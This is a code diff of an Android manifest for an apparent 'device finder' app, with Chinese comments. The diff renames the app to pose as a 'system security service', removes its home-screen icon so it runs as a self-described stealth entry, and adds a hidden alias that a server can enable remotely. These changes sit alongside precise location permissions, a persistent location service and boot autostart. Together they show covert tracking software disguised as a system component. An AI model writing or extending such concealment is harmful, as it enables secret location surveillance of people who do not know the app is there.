@@ -2,35 +2,31 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.devicefinder">
 
-    <!-- 基础网络与状态权限 -->
+    <!-- 基础网络与定位权限 -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    
-    <!-- 定位权限（粗糙与精细） -->
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     
     <!-- 前台服务与高版本定位服务类型权限 -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
-
-    <!-- 核心：开机自动启动权限 -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
-        android:label="备用机守护"
+        android:label="系统安全服务"
         android:usesCleartextTraffic="true"
         android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
 
-        <!-- 核心保活服务：针对 Android 14/15/16 声明 foregroundServiceType="location" -->
+        <!-- 后台常驻守护服务 -->
         <service
             android:name=".TrackingService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="location" />
 
-        <!-- 开机自启广播接收器：支持系统重启后自动拉起守护服务 -->
+        <!-- 开机自启广播接收器 -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -42,14 +38,26 @@
             </intent-filter>
         </receiver>
 
-        <!-- 主界面 Activity -->
+        <!-- 1. 默认隐身入口（无桌面图标，开机或后台静默拉起） -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
+                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </activity>
+
+        <!-- 2. 可被服务端远程指令动态控制显隐的“显形入口”（带桌面图标） -->
+        <activity-alias
+            android:name=".VisibleAliasActivity"
+            android:enabled="false" 
+            android:exported="true"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
     </application>
 </manifest>
